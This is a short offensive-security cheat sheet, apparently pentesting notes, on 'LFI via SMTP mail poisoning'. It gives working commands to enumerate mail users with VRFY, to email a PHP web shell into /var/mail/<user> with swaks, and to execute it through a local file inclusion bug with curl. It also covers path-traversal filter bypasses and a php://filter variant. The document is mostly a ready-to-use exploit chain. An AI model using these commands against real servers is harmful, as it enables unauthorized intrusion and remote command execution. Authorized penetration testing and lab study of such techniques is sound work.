# LFI via SMTP Mail Poisoning

When a PHP application includes user mail files via LFI (`include($_GET['page'])`), sending a crafted email to a local user causes PHP code embedded in the email body to be stored in `/var/mail/<user>` and executed when included.

## Exploit

```bash
# 1. Verify user via SMTP VRFY
smtp-user-enum -m VRFY -u <username> <TARGET> 25
# or manually:
telnet <TARGET> 25
VRFY <username>

# 2. Send PHP webshell as email body via SMTP
swaks --to <username> --from attacker@test.com \
  --header "Subject: test" \
  --body '<?php system($_REQUEST["cmd"]); ?>' \
  --server <TARGET>

# 3. Include the mail file via LFI
# Mail stored at /var/mail/<username>
curl "http://<TARGET>/page.php?page=....//....//....//var/mail/<username>&cmd=id"

# LFI path traversal variants (if ../ is filtered):
# ....//....//....// (double dot slash to evade simple ../ filter)
# php://filter/convert.base64-encode/resource=/var/mail/<user>
```

## Notes
- Works on PHP LFI where the `include()` target is user-controlled and mail is stored locally
- `/var/mail/<user>` is world-readable on many default Linux installs
- Mail file may be periodically cleared; resend if file appears empty
- The email body becomes part of the mail file — PHP tags in body get executed on include
- Requires SMTP port 25 accessible and a valid local username
